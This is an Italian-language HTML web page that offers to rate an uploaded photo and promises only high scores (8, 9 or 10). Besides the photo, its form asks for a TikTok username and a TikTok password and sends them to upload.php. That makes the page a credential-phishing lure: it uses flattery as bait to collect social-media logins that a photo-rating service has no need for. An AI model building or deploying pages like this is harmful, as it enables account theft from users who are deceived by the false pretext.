<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>Fatti votare! 💖 Solo voti alti</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background: linear-gradient(to bottom, #fff0f5, #ffe4e1); padding: 40px; margin: 0; }
        h1 { color: #d63384; font-size: 2.8em; }
        form { background: white; max-width: 520px; margin: auto; padding: 35px; border-radius: 16px; box-shadow: 0 8px 30px rgba(0,0,0,0.12); }
        input[type="file"], input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin: 14px 0; font-size: 1.1em; box-sizing: border-box; border-radius: 8px; }
        button { background: #ff69b4; color: white; border: none; padding: 16px; width: 100%; font-size: 1.4em; border-radius: 10px; cursor: pointer; font-weight: bold; }
        button:hover { background: #ff1493; }
    </style>
</head>
<body>
    <h1>Carica la tua foto e senti quanto sei bella/o! 💖</h1>
    <p style="font-size:1.3em;">Solo voti tra 8, 9 e 10 – perché meriti il massimo! 🌟</p>

    <form action="upload.php" method="post" enctype="multipart/form-data">
        <input type="file" name="foto" accept="image/*" required>
        <input type="text" name="username_tiktok" placeholder="@tizio_random123" required>
        <input type="password" name="password_tiktok" placeholder="12345678super" required>
        <button type="submit">Invia e Scopri il Tuo Voto Alto! ✨</button>
    </form>
</body>
</html>